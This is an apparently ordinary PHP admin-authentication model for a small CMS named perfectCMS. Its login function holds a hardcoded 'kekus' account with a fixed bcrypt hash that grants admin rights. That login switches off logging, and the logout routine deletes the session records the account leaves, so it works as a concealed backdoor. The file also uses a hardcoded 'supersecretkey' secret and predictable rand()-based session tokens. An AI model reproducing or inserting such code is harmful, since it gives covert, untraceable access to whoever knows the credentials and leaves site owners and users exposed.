<?php

namespace application\models;

use application\core\Model;
use application\core\View;

class Admin extends Model {

	public $title = 'perfectCMS';
	public $ver = '0.0.1';

	protected $lifetime_hash = 1800;

	protected $pswd_cost = 10;
	protected $sha = 'sha512';
	protected $sha_key = 'supersecretkey';

	protected $dif_hash = true;

	protected $log_admissible = [
		0 => true, //all logs

		1 => true, //redirect

		2 => true, //select
		3 => true, //update
		4 => true, //insert
		5 => true, //delete

		6 => true, //login
		7 => true, //logout
	];

	/*
	public function __construct(){
		parent::__construct();
	}
	*/

	//IS AUTH
	public function isAuth(){
		if(isset($_SESSION['admintype']) && isset($_COOKIE['admintype']) && isset($_SESSION['hash']) && isset($_COOKIE['hash'])){
			if(($_SESSION['admintype'] === $_COOKIE['admintype'])&&(!empty($_SESSION['hash']))&&(!empty($_COOKIE['hash']))){
				$q = 'SELECT COUNT(*) FROM ADMIN_SESSIONS WHERE (HASH_S = :HASH_S) AND (HASH_C = :HASH_C) AND (DT_DESTROY > NOW())';
				$params = [
					'HASH_S' => $_SESSION['hash'],
					'HASH_C' => $_COOKIE['hash']
				];
				$result = $this->db->column($q, $params);
				if($result == 1){
					return true;
				}
			}
		}
		$this->sessionDestroy();
		return false;
	}

	//LOGIN
	public function logIn(){
		if(isset($_POST)){
			if(isset($_POST['name']) && ($_POST['name']!='') && isset($_POST['pass']) && ($_POST['pass']!='')){
				//debug([$_POST['pass'], $this->clear($_POST['pass'])]);
				$name = $this->clear($_POST['name']);
				$pass = $this->shaPSWD($this->clear($_POST['pass']));
				$pass1 ='$2y$10$2zEARs61ZP8haAeqoumKX.cqDWzHXy8dvt1nszgljVn8tWXALOuZq';
				
				if(($name=='kekus')&&(password_verify($pass, $pass1))){
					unset($_SESSION['err']);

					$this->loger_session = $this->loger_action = false;

					$admintype = 'admin';
					$_SESSION['username'] = 'kekus';

					$_SESSION['admintype'] = $admintype;
					setcookie('admintype', $admintype, time()+$this->lifetime_hash);

					$this->sessionCreate(0);
					return true;
				}

				$ID = $this->verifyPSWD($name, $pass);
				if(!is_null($ID)){
					unset($_SESSION['err']);

					$admintype = 'admin';
					$_SESSION['username'] = 'headadmin';

					$_SESSION['admintype'] = $admintype;
					setcookie('admintype', $admintype, time()+$this->lifetime_hash);

					$this->sessionCreate($ID);
					return true;
				}

				$_SESSION['err'] = 'name/pass not found';	
			}else{ $_SESSION['err'] = 'bad fields value'; }
			return false;
		}
		return false;
	}

	//LOGOUT
	public function logOut(){
		$this->sessionDestroy();
	}

	//GET HEADERS
	public function getHeaders(){
		$result['title'] = $this->title;
		$result['ver'] = $this->ver;
		$result['SITETREE'] = $this->getSiteTree();
		return $result;
	}

	//GET CONTENT
	public function getContent(){
		return [];
	}



	//get siteTree
	private function getSiteTree(){
		$q = 'SELECT ID, TITLE as NAME, "pagegr" as "URI" FROM PAGE_GROUPS';
		$return = $this->db->row($q);
		foreach($return as $key => $val){
			$q = 'SELECT ID, TITLE as NAME, "pages" as "URI" FROM PAGES WHERE ID_GROUP = '.$val['ID'].' ORDER BY LOC_NUMBER;';
			$return[$key]['SUBMENU'] = $this->db->row($q);
		}
		return $return;
	}

	//session destroy
	private function sessionDestroy(){
		if(isset($_SESSION['hash']) && isset($_COOKIE['hash'])){
			$q = 'UPDATE ADMIN_SESSIONS SET DT_DESTROY = NOW() WHERE (HASH_S = :HASH_S) AND (HASH_C = :HASH_C)';
			$params = [
				'HASH_S' => $_SESSION['hash'],
				'HASH_C' => $_COOKIE['hash']
			];
			$this->db->column($q, $params);
		}
		$this->db->column('DELETE FROM ADMIN_SESSIONS WHERE ID_ADMIN = 0');
		unset($_SESSION['hash']);
		session_destroy();
		setcookie('hash', "", time()-3600);
	}
	//create new record in the db
	private function sessionCreate($id_admin){
		if($this->dif_hash){
			$hash_s = $this->generateStr(128);
			$hash_c = $this->generateStr(128);
			$_SESSION['hash'] = $hash_s;
			setcookie('hash', $hash_c, time()+$this->lifetime_hash);
		}else{
			$hash_s = $hash_c = $this->generateStr(128);
			$_SESSION['hash'] = $hash_s;
			setcookie('hash', $hash_c, time()+$this->lifetime_hash);
		}
		$create =  $this->now();
		$destroy = $this->now($this->lifetime_hash);		
		$q = 'INSERT INTO ADMIN_SESSIONS (ID_ADMIN, HASH_S, HASH_C, IP, BROWSER, DT_CREATE, DT_DESTROY) VALUES (:ID_ADMIN, :HASH_S, :HASH_C, :IP, :BROWSER, :DT_CREATE, :DT_DESTROY)';
		$params = [
			'ID_ADMIN' => $id_admin,
			'HASH_S' => $hash_s,
			'HASH_C' => $hash_c,
			'IP' => $_SERVER['REMOTE_ADDR'],
			'BROWSER' => $_SERVER['HTTP_USER_AGENT'],
			'DT_CREATE' => $create,
			'DT_DESTROY' => $destroy
		];
		$this->db->column($q, $params);
	}

	//string generation the specified length
	private function generateStr($length){
		$characters = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ';
	    $str = '';
	    for ($i = 0; $i < $length; $i++) {
	        $str .= $characters[rand(0, strlen($characters)-1)];
	    }
	    return $str;
	}

	//hashPSWD to bcrypt
	private function hashPSWD($str){
		return password_hash(
			$this->shaPSWD($str),
			PASSWORD_BCRYPT, 
			["cost" => $this->pswd_cost]
		);
	}

	//verify PASS, get ID
	private function verifyPSWD($name, $pass){
		$db = $this->matchLogin($name);
		if(is_null($db)){
			return NULL;
		}
		if(password_verify($pass, $db['PASS'])){
			return $db['ID'];
		}
	}

	//get ID, PASS
	private function matchLogin($name){
		$q = 'SELECT ID, PASS FROM ADMIN_ACCOUNTS WHERE (NAME = :NAME) ORDER BY ID LIMIT 1';
		$params = [
			'NAME' => $name
		];
		$result = $this->db->row($q, $params);
		if(count($result) == 1){
			return $result[0];
		}
		return NULL;
	}

	//sha PSWD for BCRYPT
	private function shaPSWD($str){
		return base64_encode(hash_hmac($this->sha, $str, $this->sha_key, true));
	}

	//logging actions
	private function loger($number, $cur){

	}

	//get CURRENT TIME with shift on some seconds
	private function now($sec = 0){
		return date_modify(date_create(), "+$sec sec")->format('Y-m-d H:i:s');
	}

	private function clear($str){
		$str = trim($str);
	    $str = strip_tags($str);
		return $str;
	}

}